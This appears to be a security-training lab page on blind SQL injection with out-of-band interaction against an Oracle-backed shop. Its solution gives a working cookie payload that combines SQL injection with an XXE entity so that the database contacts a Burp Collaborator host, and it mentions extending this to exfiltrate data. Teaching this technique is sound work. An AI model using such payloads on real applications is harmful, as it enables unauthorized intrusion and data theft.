# Lab: Blind SQL injection with out-of-band interaction

### PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.  

```
Note
```
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server (burpcollaborator.net). 
```
Hint
```
This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Solution

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie.
2. Modify the <code>TrackingId</code> cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic <a href="/web-security/xxe">XXE</a> techniques as follows: <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code>.

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use <a href="/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator client</a> to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

